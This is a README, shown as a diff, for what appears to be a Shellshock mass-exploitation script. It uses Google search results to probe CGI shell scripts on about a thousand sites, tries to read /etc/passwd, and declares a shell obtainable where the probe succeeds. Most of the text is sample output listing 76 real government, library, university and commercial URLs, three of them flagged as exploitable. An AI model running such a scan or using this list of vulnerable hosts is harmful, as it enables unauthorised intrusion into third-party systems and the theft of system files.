@@ -1,0 +1,92 @@
+prerequisite
+============
+
+1. `sudo pip install shell`
+2. install google python search.  https://github.com/MarioVilas/google
+
+Run
+===
+I use google to search first 1000 sites and try to get the `/etc/passwd`
+
+if second field is `!!!`, then You Can Get SHELL!
+
+```
+master ✗ $ python shellshock.py
+0 --- http://nomad3.ncep.noaa.gov/cgi-bin/pdisp_sst.sh
+1 --- http://nomad5.ncep.noaa.gov/cgi-bin/pdisp_gfs.sh?ctlfile=gfs_00z.ctl&povlp=noovlp&ptype=map&dir
+2 --- http://igloo.atmos.uiuc.edu/cgi-bin/test/print.sh
+3 --- http://www.itu.int/cgi-bin/htsh/mars/ship_search.sh
+4 --- http://www.emsc-csem.org/cgi-bin/QDM_all.sh
+5 --- http://searches.rootsweb.ancestry.com/cgi-bin/Genea/soundex.sh
+6 --- https://github.com/web20suicide/cgi-bin/blob/master/start_selenium.sh
+7 --- https://dev.openwrt.org/browser/branches/whiterussian/openwrt/package/webif/files/www/cgi-bin/webif/info.sh?rev=2079
+8 --- http://xformstest.org/cgi-bin/echo.sh
+9 --- http://aoewar.wapka.mobi/1/http://savannah.gnu.org/cgi-bin/viewcvs/~checkout~/texinfo/texinfo/util/gendocs.sh
+10 --- http://virtual-library.culturalservices.net/cgi-bin/vlib.sh
+11 --- http://libcat.hants.gov.uk/cgi-bin/hampshire-cat.sh
+12 --- http://tycho.usno.navy.mil/cgi-bin/daterdnm.sh
+13 --- http://machaut.uchicago.edu/cgi-bin/WEBSTER.sh?WORD=atheist
+14 --- https://gitorious.org/tinylab/vnstatsvg/source/6ee31f9fa72b7d8593ce0d10dd5394f49c4c62e7:src/cgi-bin/proxy.sh
+15 --- http://www.rzp.cz/cgi-bin/aps_cacheWEB.sh?VSS_SERV=ZVWSBJFND
+16 --- http://www.hotelroyalbonrepos.fr/cgi-bin/shinfo.sh
+17 --- https://developer.digitalstrom.org/dss11-websetup/dss11-websetup/blobs/075daf32ff3da43bf5a89b80eccf081621c0a87d/www/cgi-bin/opkg.sh
+18 --- http://websis.mit.edu/cgi-bin/aghswapp.sh
+19 --- http://rcswww.urz.tu-dresden.de/cgi-bin/cgiwrapd/s9470406/test.sh?LANG=de
+20 --- http://library.fingalcoco.ie/cgi-bin/vps2.6_selfreg.sh
+21 --- http://www.nevis.columbia.edu/cgi-bin/man.sh?man=sort
+22 --- http://minecraftonline.com/cgi-bin/strongholdfinder.sh
+23 --- http://www.altrom.com/cgi-bin/altmake.sh
+24 --- http://195.251.42.2/cgi-bin/nisehist.sh?objtype=stats_query
+25 --- http://dict.revised.moe.edu.tw/cgi-bin/newDict/dict.sh?idx=dict.idx&cond=%AF%AF&fld=1
+26 --- https://damjan.softver.org.mk/cgi-bin/ps.sh
+27 --- http://www.sron.nl/divisions/hea/klumper/cgi-bin//test.sh
+28 --- http://www.devon.gov.uk/library/catalogue/cgi-bin/vps2.5_resource_auth.sh
+29 --- http://dxworld.com/cgi-bin/bcbdx.sh
+30 --- http://www.reg.uci.edu/cgi-bin/webreg-law-redirect.sh
+31 --- http://www.hypart.de/cgi-bin/main.sh
+32 --- http://www.gallery.cz/cgi-bin/hynekol/aps.sh?VSS_SERV=gobraz&galpre=1036&language=en
+33 --- http://hg.slitaz.org/slitaz-tools/log/48ac90e80745/hacker/Templates/cgi-bin-text.sh
+34 --- http://hg.slitaz.org/slitaz-tools/log/48ac90e80745/hacker/Public/cgi-bin/tests.sh
+35 --- http://www.openbsd.org/cgi-bin/cvsweb/src/usr.bin/true/true.sh
+36 --- http://www.traditionalcatholicmedia.org/cgi-bin/ListAllUploads.sh
+37 --- http://linuxtv.org/cgi-bin/cvsweb.cgi/dvb-kernel/MAKEDEV-DVB.sh
+38 --- http://www.itu.dk/cgi-bin/cgiwrap/bm/viewcvs/cgi/viewcvs.cgi/speciale/code/bin/mvm1.sh?graph=1&search=None&hideattic=0
+39 --- http://itu.dk/cgi-bin/cgiwrap/bm/viewcvs/cgi/viewcvs.cgi/speciale/code/bin/mvm3.sh?graph=1.12&sortby=log&only_with_tag=HEAD
+40 --- http://morseringtones.com/cgi-bin/generate_ringtone.sh
+41 --- http://www2.library.pref.kyoto.jp/cgi-bin/ilisoudan/odplus.sh
+42 --- http://www3.hplibra.pref.hiroshima.jp/cgi-bin/ilisod/odplus.sh
+43 --- http://svn.augsburg.freifunk.net/old/ff-ipkg/freifunk-dhcpsplash-qos-augsburg/www/cgi-bin/dhcpsplash/functions.sh
+44 --- http://comite2011.yellis.net/cgi-bin/shinfo.sh
+45 --- http://sources.gentoo.org/cgi-bin/viewvc.cgi/gentoo/src/relnotes/genrelnotes.sh?content-type=text%2Fplain
+46 --- http://www.xmarks.com/site/www.itu.int/cgi-bin/htsh/mars/ship_search.sh
+47 --- https://ads.curie.fr/cgi-bin/seminaires/liste.sh
+48 --- https://www.library.city.himeji.hyogo.jp/cgi-bin/Sopcsmin.sh
+49 --- https://www.wrexham.gov.uk/Library-Online-Catalogue/cgi-bin/vps2_viewpoint.sh
+50 !!! http://140.111.34.46/cgi-bin/newDict/dict.sh?idx=dict.idx&pieceLen=50&fld=1&cat=&imgFont=1&cond=%BD%D0
+51 --- http://doompalm.westsussex.gov.uk/cgi-bin/civis_server.sh?session_no=1111767&enqtype=SECOND&enqpara1=RESULT&rcn=103173&media_code=&sec_code=&page=0&no_of_results=24&type=PHRASE
+52 !!! http://entropy.me.uk/simutrans/server/cgi-bin/sim128a.sh
+53 --- http://www.pmf.sc.gov.br/cgi-bin/tm38220.sh
+54 --- http://www.library.pref.hyogo.lg.jp/cgi-bin/ilisod/odplus.sh
+55 --- http://www.library.city.hiroshima.jp/cgi-bin/Sopcsmin.sh
+56 --- http://www-library.kumamoto-kmm.ed.jp/cgi-bin/Sopcsmin.sh
+57 !!! http://sals.ncsl.com.pg/cgi-bin/salsweb-jcgi.sh?Program=app/Web/NewMember.p&ProcName=MemberNoForm&tSALSFund=NCSL
+58 --- http://sortelli.com/cgi-bin/krypto.sh
+59 --- http://interhost.ptb.de/cgi-bin/interhost.sh?id=0&action=login&name=PUBLICA_gr&lang=gr
+60 --- http://www.nb.no/cgi-bin/galnor/gn_sok.sh?context=0&offset=0&skjema=0&type=e&tittel=avaldsnes%20kirke&Start=S%C3%B8k&fm=1&limit=20&user_offset=1
+61 --- http://www.emacswiki.org/emacs/get-icicles.sh
+62 --- http://204.225.221.12/cgi-bin/nph-update-firmware-a.sh
+63 --- http://www.pref.saga.lg.jp/manabi-kensaku/cgi-bin/ilisod/odplus.sh
+64 --- http://www.library.pref.gifu.lg.jp/cgi-bin/Sopcsmin5.sh?p_mode=5
+65 --- http://www.theochem.uni-stuttgart.de/cgi-bin/pe.sh?References
+66 --- http://monsenat.senat.fr/cgi-bin/pdfRHF.sh?id=15
+67 --- http://tosyokan.karatsu-city.jp/cgi-bin/Sopcsmin.sh
+68 --- http://alisliboudan.tokushima-ec.ed.jp/cgi-bin/ilisod/odplus.sh
+69 --- http://www.library.city.hekinan.aichi.jp/cgi-bin/Sopcsmin.sh
+70 --- http://ota.nwn.no/cgi-bin/legacy_cgi.sh?pin=768621oesmsjnc
+71 --- http://pingtool.org/cgi-bin/test.sh
+72 --- http://ccgi.mm7323.free-online.co.uk/cgi-bin/weather.sh
+73 --- http://opac.library.pref.tottori.jp/cgi-bin/Sttrsmin.sh
+74 --- http://grey.colorado.edu/cgi-bin/viewvc.cgi/emergent/trunk/src/emergent/bin/emergent-desktop.sh?pathrev=6618&sortdir=down&view=diff&r1=4724&r2=4721&diff_format=c
+75 --- https://lpc-afs.web.cern.ch/lpc-afs/cgi-bin/webpage.sh
+```
+
